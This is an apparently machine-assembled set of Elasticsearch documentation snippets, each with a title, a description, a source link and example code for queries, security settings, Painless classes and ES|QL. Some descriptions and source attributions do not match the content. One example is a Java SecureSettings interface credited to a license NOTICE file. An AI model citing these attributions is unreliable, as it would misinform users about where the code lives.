  }\n    }\n  }\n}\n\nPUT /my_geoshapes/_doc/1\n{\n  \"pin\": {\n    \"location\": {\n      \"type\" : \"polygon\",\n      \"coordinates\" : [[[13.0 ,51.5], [15.0, 51.5], [15.0, 54.0], [13.0, 54.0], [13.0 ,51.5]]]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Content Document with Access Control\nDESCRIPTION: These code snippets provide examples of a content document and illustrate which users have access depending on their permissions. The `_allow_access_control` array determines who can view the document based on matching identities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-overview.md#2025-04-21_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n```js\n{\n  \"_id\": \"some-unique-id-1\",\n  \"_allow_access_control\": [\n    \"example.user@example.com\",\n    \"example group\",\n    \"example username\"\n  ]\n}\n```\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n```js\n{\n  \"_id\": \"some-unique-id-2\",\n  \"_allow_access_control\": [\n    \"example group\"\n  ]\n}\n```\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n```js\n{\n  \"_id\": \"some-unique-id-3\",\n  \"_allow_access_control\": [\n    \"another.user@example.com\"\n  ]\n}\n```\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n```js\n{\n  \"_id\": \"some-unique-id-4\",\n  \"_allow_access_control\": []\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Creating an API Key for the Connector\nDESCRIPTION: This snippet outlines the process of creating an API key necessary for the connector's operation. It specifies the required role descriptors and privileges. The user needs to have cluster privileges to manage API keys.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n\"POST /_security/api_key\\n{\\n  \\\"name\\\": \\\"connector_name-connector-api-key\\\",\\n  \\\"role_descriptors\\\": {\\n    \\\"connector_name-connector-role\\\": {\\n      \\\"cluster\\\": [\\n        \\\"monitor\\\",\\n        \\\"manage_connector\\\"\\n      ],\\n      \\\"indices\\\": [\\n        {\\n          \\\"names\\\": [\\n            \\\"index_name\\\",\\n            \\\".search-acl-filter-index_name\\\",\\n            \\\".elastic-connectors*\\\"\\n          ],\\n          \\\"privileges\\\": [\\n            \\\"all\\\"\\n          ],\\n          \\\"allow_restricted_indices\\\": false\\n        }\\n      ]\\n    }\\n  }\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Generate Node Keystore with Keytool\nDESCRIPTION: Creates a JKS keystore for the node with RSA key and SAN extensions for localhost variants\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -genkey -alias test-node -keystore test-node.jks -keyalg RSA -keysize 2048 -validity 3654 -dname CN=\"Elasticsearch Build Test Infrastructure\" -keypass keypass -storepass keypass -ext san=dns:localhost,dns:localhost.localdomain,dns:localhost4,dns:localhost4.localdomain4,dns:localhost6,dns:localhost6.localdomain6,ip:127.0.0.1,ip:0:0:0:0:0:0:0:1\n```\n\n----------------------------------------\n\nTITLE: Defining Java Character.UnicodeScript Enum\nDESCRIPTION: This snippet defines the values and methods available for the java.lang.Character$UnicodeScript enum within Painless scripting. It lists all the supported Unicode scripts and associated methods for obtaining UnicodeScript instances.  These scripts can be used for character classification and processing in Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_25\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.Character$UnicodeScript {\\n  Character.UnicodeScript ARABIC\\n  Character.UnicodeScript ARMENIAN\\n  Character.UnicodeScript AVESTAN\\n  Character.UnicodeScript BALINESE\\n  Character.UnicodeScript BAMUM\\n  Character.UnicodeScript BATAK\\n  Character.UnicodeScript BENGALI\\n  Character.UnicodeScript BOPOMOFO\\n  Character.UnicodeScript BRAHMI\\n  Character.UnicodeScript BRAILLE\\n  Character.UnicodeScript BUGINESE\\n  Character.UnicodeScript BUHID\\n  Character.UnicodeScript CANADIAN_ABORIGINAL\\n  Character.UnicodeScript CARIAN\\n  Character.UnicodeScript CHAKMA\\n  Character.UnicodeScript CHAM\\n  Character.UnicodeScript CHEROKEE\\n  Character.UnicodeScript COMMON\\n  Character.UnicodeScript COPTIC\\n  Character.UnicodeScript CUNEIFORM\\n  Character.UnicodeScript CYPRIOT\\n  Character.UnicodeScript CYRILLIC\\n  Character.UnicodeScript DESERET\\n  Character.UnicodeScript DEVANAGARI\\n  Character.UnicodeScript EGYPTIAN_HIEROGLYPHS\\n  Character.UnicodeScript ETHIOPIC\\n  Character.UnicodeScript GEORGIAN\\n  Character.UnicodeScript GLAGOLITIC\\n  Character.UnicodeScript GOTHIC\\n  Character.UnicodeScript GREEK\\n  Character.UnicodeScript GUJARATI\\n  Character.UnicodeScript GURMUKHI\\n  Character.UnicodeScript HAN\\n  Character.UnicodeScript HANGUL\\n  Character.UnicodeScript HANUNOO\\n  Character.UnicodeScript HEBREW\\n  Character.UnicodeScript HIRAGANA\\n  Character.UnicodeScript IMPERIAL_ARAMAIC\\n  Character.UnicodeScript INHERITED\\n  Character.UnicodeScript INSCRIPTIONAL_PAHLAVI\\n  Character.UnicodeScript INSCRIPTIONAL_PARTHIAN\\n  Character.UnicodeScript JAVANESE\\n  Character.UnicodeScript KAITHI\\n  Character.UnicodeScript KANNADA\\n  Character.UnicodeScript KATAKANA\\n  Character.UnicodeScript KAYAH_LI\\n  Character.UnicodeScript KHAROSHTHI\\n  Character.UnicodeScript KHMER\\n  Character.UnicodeScript LAO\\n  Character.UnicodeScript LATIN\\n  Character.UnicodeScript LEPCHA\\n  Character.UnicodeScript LIMBU\\n  Character.UnicodeScript LINEAR_B\\n  Character.UnicodeScript LISU\\n  Character.UnicodeScript LYCIAN\\n  Character.UnicodeScript LYDIAN\\n  Character.UnicodeScript MALAYALAM\\n  Character.UnicodeScript MANDAIC\\n  Character.UnicodeScript MEETEI_MAYEK\\n  Character.UnicodeScript MEROITIC_CURSIVE\\n  Character.UnicodeScript MEROITIC_HIEROGLYPHS\\n  Character.UnicodeScript MIAO\\n  Character.UnicodeScript MONGOLIAN\\n  Character.UnicodeScript MYANMAR\\n  Character.UnicodeScript NEW_TAI_LUE\\n  Character.UnicodeScript NKO\\n  Character.UnicodeScript OGHAM\\n  Character.UnicodeScript OL_CHIKI\\n  Character.UnicodeScript OLD_ITALIC\\n  Character.UnicodeScript OLD_PERSIAN\\n  Character.UnicodeScript OLD_SOUTH_ARABIAN\\n  Character.UnicodeScript OLD_TURKIC\\n  Character.UnicodeScript ORIYA\\n  Character.UnicodeScript OSMANYA\\n  Character.UnicodeScript PHAGS_PA\\n  Character.UnicodeScript PHOENICIAN\\n  Character.UnicodeScript REJANG\\n  Character.UnicodeScript RUNIC\\n  Character.UnicodeScript SAMARITAN\\n  Character.UnicodeScript SAURASHTRA\\n  Character.UnicodeScript SHARADA\\n  Character.UnicodeScript SHAVIAN\\n  Character.UnicodeScript SINHALA\\n  Character.UnicodeScript SORA_SOMPENG\\n  Character.UnicodeScript SUNDANESE\\n  Character.UnicodeScript SYLOTI_NAGRI\\n  Character.UnicodeScript SYRIAC\\n  Character.UnicodeScript TAGALOG\\n  Character.UnicodeScript TAGBANWA\\n  Character.UnicodeScript TAI_LE\\n  Character.UnicodeScript TAI_THAM\\n  Character.UnicodeScript TAI_VIET\\n  Character.UnicodeScript TAKRI\\n  Character.UnicodeScript TAMIL\\n  Character.UnicodeScript TELUGU\\n  Character.UnicodeScript THAANA\\n  Character.UnicodeScript THAI\\n  Character.UnicodeScript TIBETAN\\n  Character.UnicodeScript TIFINAGH\\n  Character.UnicodeScript UGARITIC\\n  Character.UnicodeScript UNKNOWN\\n  Character.UnicodeScript VAI\\n  Character.UnicodeScript YI\\n  Character.UnicodeScript forName(String)\\n  Character.UnicodeScript of(int)\\n  Character.UnicodeScript valueOf(String)\\n  Character.UnicodeScript[] values()\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Configuring CamelCase Tokenizer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure the `pattern` analyzer as a CamelCase tokenizer in Elasticsearch, splitting text based on specific patterns to separate words in CamelCase strings. It includes defining the analyzer with a complex regular expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"camel\": {\n          \"type\": \"pattern\",\n          \"pattern\": \"([^\\\\p{L}\\\\d]+)|(?<=\\\\D)(?=\\\\d)|(?<=\\\\d)(?=\\\\D)|(?<=[\\\\p{L}&&[^\\\\p{Lu}]])(?=\\\\p{Lu})|(?<=\\\\p{Lu})(?=\\\\p{Lu}[\\\\p{L}&&[^\\\\p{Lu}]])\"\n        }\n      }\n    }\n  }\n}\n\nGET my-index-000001/_analyze\n{\n  \"analyzer\": \"camel\",\n  \"text\": \"MooseX::FTPClass2_beta\"\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Source2 Access Control Document in Elasticsearch\nDESCRIPTION: Example of an Elasticsearch GET request to retrieve the access control document for a user from the source2 index, similar to source1 but with different group membership.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-e2e-guide.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nGET .search-acl-filter-source2\n{\n  \"_id\": \"example.user@example.com\",\n  \"identity\": {\n      \"username\": \"example username\",\n      \"email\": \"example.user@example.com\"\n   },\n   \"query\": {\n        \"template\": {\n            \"params\": {\n                \"access_control\": [\n                    \"example.user@example.com\",\n                    \"source2-user-group\"]\n            }\n        },\n        \"source\": \"...\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting X Coordinate with ST_X in Elasticsearch SQL\nDESCRIPTION: Returns the longitude (X coordinate) of the first point in a geometry. This function takes a geometry as input and returns a double value representing the X coordinate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-geo.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nST_X(\n    geometry <1>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ST_X(ST_WKTToSQL('POINT (10 20)')) x;\n\n      x:d\n10.0\n```\n\n----------------------------------------\n\nTITLE: Formatting Dates using DATE_FORMAT in ESQL\nDESCRIPTION: Example query showing how to format a date field using DATE_FORMAT function with a specific pattern. The query keeps specific employee fields and creates a new column 'hired' with the formatted hire_date using 'yyyy-MM-dd' pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/date_format.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, hire_date\n| EVAL hired = DATE_FORMAT(\"yyyy-MM-dd\", hire_date)\n```\n\n----------------------------------------\n\nTITLE: Running the Docker image for the Connector Service\nDESCRIPTION: This command runs the Docker image for the Elastic Connector Service, mounting the configuration directory and specifying the network. It executes the `elastic-ingest` command with the configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: ZoneId Methods and Fields\nDESCRIPTION: Details the methods and fields within the java.time.ZoneId class. It provides a summary on how to create and retrieve zone IDs, including functionalities for obtaining available zone IDs, retrieving the ID, getting display names, normalizing IDs, and accessing zone rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_16\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.ZoneId {\n  Map SHORT_IDS\n  Set getAvailableZoneIds()\n  ZoneId of(String)\n  ZoneId of(String,Map)\n  ZoneId ofOffset(String,ZoneOffset)\n  ZoneId from(TemporalAccessor)\n  String getId()\n  String getDisplayName(TextStyle,Locale)\n  ZoneId normalized()\n  ZoneId systemDefault()\n  ZoneRules getRules()\n}\"\n```\n\n----------------------------------------\n\nTITLE: Diversified Sampler with Runtime Fields in Elasticsearch\nDESCRIPTION: Example using diversified_sampler with a runtime field to diversify based on tag combinations. This creates a hash of the multiple values in a tags field to ensure the sample doesn't contain repeated tag combinations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-diversified-sampler-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /stackoverflow/_search?size=0\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"tags:kibana\"\n    }\n  },\n  \"runtime_mappings\": {\n    \"tags.hash\": {\n      \"type\": \"long\",\n      \"script\": \"emit(doc['tags'].hashCode())\"\n    }\n  },\n  \"aggs\": {\n    \"my_unbiased_sample\": {\n      \"diversified_sampler\": {\n        \"shard_size\": 200,\n        \"max_docs_per_value\": 3,\n        \"field\": \"tags.hash\"\n      },\n      \"aggs\": {\n        \"keywords\": {\n          \"significant_terms\": {\n            \"field\": \"tags\",\n            \"exclude\": [ \"kibana\" ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"my_unbiased_sample\": {\n      \"doc_count\": 6,\n      \"keywords\": {\n        \"doc_count\": 6,\n        \"bg_count\": 650,\n        \"buckets\": [\n          {\n            \"key\": \"logstash\",\n            \"doc_count\": 3,\n            \"score\": 2.213,\n            \"bg_count\": 50\n          },\n          {\n            \"key\": \"elasticsearch\",\n            \"doc_count\": 3,\n            \"score\": 1.34,\n            \"bg_count\": 200\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting Azure VM Instance (Shell)\nDESCRIPTION: This command demonstrates how to delete a running Azure VM instance using the Azure CLI. It's useful for cleaning up resources when they're no longer needed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-scale.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\nazure vm delete myesnode1\n```\n\n----------------------------------------\n\nTITLE: Complex Query Profile Response\nDESCRIPTION: Detailed profile response showing query execution breakdown, including timing for term queries, collectors, and aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_7\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"profile\": {\n    \"shards\": [\n      {\n        \"id\": \"[P6xvulHtQRWuD4YnubWb7A][my-index-000001][0]\",\n        \"node_id\": \"P6xvulHtQRWuD4YnubWb7A\",\n        \"shard_id\": 0,\n        \"index\": \"my-index-000001\",\n        \"cluster\": \"(local)\",\n        \"searches\": [\n          {\n            \"query\": [\n              {\n                \"type\": \"TermQuery\",\n                \"description\": \"message:search\",\n                \"time_in_nanos\": 141618,\n                \"breakdown\": {\n                  \"set_min_competitive_score_count\": 0,\n                  \"match_count\": 0,\n                  \"shallow_advance_count\": 0,\n                  \"set_min_competitive_score\": 0,\n                  \"next_doc\": 0,\n                  \"match\": 0,\n                  \"next_doc_count\": 0,\n                  \"score_count\": 0,\n                  \"compute_max_score_count\": 0,\n                  \"compute_max_score\": 0,\n                  \"advance\": 3942,\n                  \"advance_count\": 4,\n                  \"count_weight_count\": 0,\n                  \"score\": 0,\n                  \"build_scorer_count\": 2,\n                  \"create_weight\": 38380,\n                  \"shallow_advance\": 0,\n                  \"count_weight\": 0,\n                  \"create_weight_count\": 1,\n                  \"build_scorer\": 99296\n                }\n              },\n              {\n                \"type\": \"TermQuery\",\n                \"description\": \"user.id:elkbee\",\n                \"time_in_nanos\": 163081,\n                \"breakdown\": {\n                  \"set_min_competitive_score_count\": 0,\n                  \"match_count\": 0,\n                  \"shallow_advance_count\": 0,\n                  \"set_min_competitive_score\": 0,\n                  \"next_doc\": 2447,\n                  \"match\": 0,\n                  \"next_doc_count\": 4,\n                  \"score_count\": 4,\n                  \"compute_max_score_count\": 0,\n                  \"compute_max_score\": 0,\n                  \"advance\": 3552,\n                  \"advance_count\": 1,\n                  \"score\": 5027,\n                  \"count_weight_count\": 0,\n                  \"build_scorer_count\": 2,\n                  \"create_weight\": 107840,\n                  \"shallow_advance\": 0,\n                  \"count_weight\": 0,\n                  \"create_weight_count\": 1,\n                  \"build_scorer\": 44215\n                }\n              }\n            ],\n            \"rewrite_time\": 4769,\n            \"collector\": [\n              {\n                \"name\": \"QueryPhaseCollector\",\n                \"reason\": \"search_query_phase\",\n                \"time_in_nanos\": 1945072,\n                \"children\": [\n                  {\n                    \"name\": \"SimpleTopScoreDocCollector\",\n                    \"reason\": \"search_top_hits\",\n                    \"time_in_nanos\": 22577\n                  },\n                  {\n                    \"name\": \"AggregatorCollector: [my_scoped_agg, my_global_agg]\",\n                    \"reason\": \"aggregation\",\n                    \"time_in_nanos\": 867617\n                  }\n                ]\n              }\n            ]\n          }\n        ],\n        \"aggregations\": [...],\n        \"fetch\": {...}\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Median Absolute Deviation in ESQL\nDESCRIPTION: Example showing how to calculate both median absolute deviation and median from an array of integer values using ESQL's built-in functions. The example uses MV_MEDIAN_ABSOLUTE_DEVIATION and MV_MEDIAN functions on an array of [0, 2, 5, 6].\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW values = [0, 2, 5, 6]\n| EVAL median_absolute_deviation = MV_MEDIAN_ABSOLUTE_DEVIATION(values), median = MV_MEDIAN(values)\n```\n\n----------------------------------------\n\nTITLE: Month Enum Methods and Fields\nDESCRIPTION: Describes the enum constants and methods of java.time.Month. Outlines how to represent and manipulate months of the year, including obtaining a Month from a value, retrieving localized names, and performing arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_19\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.Month {\n  Month APRIL\n  Month AUGUST\n  Month DECEMBER\n  Month FEBRUARY\n  Month JANUARY\n  Month JULY\n  Month JUNE\n  Month MARCH\n  Month MAY\n  Month NOVEMBER\n  Month OCTOBER\n  Month SEPTEMBER\n  Month from(TemporalAccessor)\n  int firstDayOfYear(boolean)\n  Month firstMonthOfQuarter()\n  int getValue()\n  String getDisplayName(TextStyle,Locale)\n  int length(boolean)\n  int maxLength()\n  int minLength()\n  Month minus(long)\n  Month of(int)\n  Month plus(long)\n  Month valueOf(String)\n  Month[] values()\n}\"\n```\n\n----------------------------------------\n\nTITLE: Binding with LDAPConnection using String Credentials\nDESCRIPTION: This entry describes the binding method that takes username and password strings. It's commonly used for simple authentication in LDAP connections, assuming basic credential management.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/ldap-signatures.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\ncom.unboundid.ldap.sdk.LDAPConnection#bind(java.lang.String, java.lang.String)\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Compatibility Matrix Table in Markdown\nDESCRIPTION: A markdown table defining valid type combinations for ESQL functions. Shows compatible type combinations between first argument, rest arguments, and result types. Important for understanding type coercion and compatibility in ESQL operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/least.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| first | rest | result |\n| --- | --- | --- |\n| boolean | boolean | boolean |\n| boolean | | boolean |\n| date | date | date |\n| date_nanos | date_nanos | date_nanos |\n| double | double | double |\n| integer | integer | integer |\n| integer | | integer |\n| ip | ip | ip |\n| keyword | keyword | keyword |\n| keyword | | keyword |\n| long | long | long |\n| long | | long |\n| text | text | keyword |\n| text | | keyword |\n| version | version | version |\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON MultiPolygon in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON MultiPolygon in Elasticsearch. The example shows two polygons, with the second polygon containing a hole, represented as nested arrays of coordinate pairs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_14\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"multipolygon\",\n    \"coordinates\" : [\n      [ [[1002.0, 200.0], [1003.0, 200.0], [1003.0, 300.0], [1002.0, 300.0], [1002.0, 200.0]] ],\n      [ [[1000.0, 200.0], [1001.0, 100.0], [1001.0, 100.0], [1000.0, 100.0], [1000.0, 100.0]],\n        [[1000.2, 200.2], [1000.8, 100.2], [1000.8, 100.8], [1000.2, 100.8], [1000.2, 100.2]] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing SecureSettings Interface in Java for Elasticsearch\nDESCRIPTION: This code defines the SecureSettings interface, which provides methods for accessing secure string and file settings. It includes methods for retrieving secure strings, files, and setting names, as well as creating new instances.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/accessors-smart-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\npublic interface SecureSettings extends Closeable {\n    SecureString getString(String setting);\n    InputStream getFile(String setting);\n    Set<String> getSettingNames();\n    SecureSettings clone();\n    void close();\n\n    static SecureSettings EMPTY = new SecureSettings() {\n        @Override\n        public SecureString getString(String setting) {\n            return null;\n        }\n\n        @Override\n        public InputStream getFile(String setting) {\n            return null;\n        }\n\n        @Override\n        public Set<String> getSettingNames() {\n            return Collections.emptySet();\n        }\n\n        @Override\n        public SecureSettings clone() {\n            return this;\n        }\n\n        @Override\n        public void close() {}\n    };\n}\n```\n\n----------------------------------------\n\nTITLE: Moman/Finenight FSA License Notice\nDESCRIPTION: MIT license terms for the Moman/Finenight FSA package used to generate Levenshtein automata tables in Lucene.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-smartcn/licenses/lucene-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# Copyright (c) 2010, Jean-Philippe Barrette-LaPierre, <jpb@rrette.com>\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation\n# files (the \"Software\"), to deal in the Software without\n# restriction, including without limitation the rights to use,\n# copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the\n# Software is furnished to do so, subject to the following\n# conditions:\n#\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n```\n\n----------------------------------------\n\nTITLE: ES|QL Text Field Conversion to Keyword Example\nDESCRIPTION: This example demonstrates how ES|QL converts text fields to keyword fields when used in functions.  Regardless of whether field1, field2, and field3 are text fields, the resulting 'greatest' column will be of type keyword.  This behavior is due to ES|QL's treatment of text fields, and how functions operating on both text and keyword fields will treat the text field as if it were a keyword field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\n\n| FROM index\n| EVAL greatest = GREATEST(field1, field2, field3)\n\n```\n\n----------------------------------------\n\nTITLE: Defining BytesRefProducer Class for Whitelisting\nDESCRIPTION: This code defines the class org.elasticsearch.script.BytesRefProducer, which is whitelisted to allow Painless scripts access to its functionality. It acts as a producer for byte references, which are crucial in certain script operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.bytesref_sort.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.BytesRefProducer @no_import {\n}\n\n```\n\n----------------------------------------\n\nTITLE: Defining Whitelisted Class in Painless\nDESCRIPTION: This snippet defines a whitelisted class that includes constructors, static methods, and instance members, specifying accessors for private members. This structure is intended to demonstrate how classes are defined within the context of Painless scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/examples/painless-whitelist/src/main/resources/org/elasticsearch/example/painlesswhitelist/example_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.example.painlesswhitelist.ExampleWhitelistedClass {\n  # constructor\n  (int, int)\n\n  # static constants and methods look the same as instance members and methods\n  int CONSTANT\n  void staticMethod()\n\n  # members lack parenthesis that methods have\n  int publicMember\n\n  # getter and setter for private member\n  int getPrivateMemberAccessor()\n  void setPrivateMemberAccessor(int)\n\n  # annotation\n  void annotate() @example_annotation[category=\"1\",message=\"example annotation\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Moman/Finenight FSA Copyright Notice\nDESCRIPTION: Copyright notice and MIT license terms for the levenshtein automata tables generated using moman/finenight FSA package\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-kuromoji/licenses/lucene-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# Copyright (c) 2010, Jean-Philippe Barrette-LaPierre, <jpb@rrette.com>\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation\n# files (the \"Software\"), to deal in the Software without\n# restriction, including without limitation the rights to use,\n# copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the\n# Software is furnished to do so, subject to the following\n# conditions:\n#\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n```\n\n----------------------------------------\n\nTITLE: RRF Formula Calculation for Final Document Ranking in Python\nDESCRIPTION: A Python-like representation of the Reciprocal Rank Fusion formula calculation, showing how document scores are computed from individual retriever rankings to produce the final combined score.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n# doc  | query     | knn       | score\n_id: 1 = 1.0/(1+4) + 1.0/(1+3) = 0.4500\n_id: 2 = 1.0/(1+3) + 1.0/(1+2) = 0.5833\n_id: 3 = 1.0/(1+2) + 1.0/(1+1) = 0.8333\n_id: 4 = 1.0/(1+1)             = 0.5000\n_id: 5 =             1.0/(1+4) = 0.2000\n```\n\n----------------------------------------\n\nTITLE: Simulating Script Processor to Extract Tags from Env Field\nDESCRIPTION: This example demonstrates how to use a Painless script in the script processor to extract tags from an 'env' field. It splits the field value, extracts a specific part, and assigns it to a new 'tags' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/script-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"script\": {\n          \"description\": \"Extract 'tags' from 'env' field\",\n          \"lang\": \"painless\",\n          \"source\": \"\"\"\n            String[] envSplit = ctx['env'].splitOnToken(params['delimiter']);\n            ArrayList tags = new ArrayList();\n            tags.add(envSplit[params['position']].trim());\n            ctx['tags'] = tags;\n          \"\"\",\n          \"params\": {\n            \"delimiter\": \"-\",\n            \"position\": 1\n          }\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"env\": \"es01-prod\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Parameter documentation section defining input string, substring to search for, and start index position. The documentation appears to be auto-generated by ESQL's AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/locate.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`string`\n:   An input 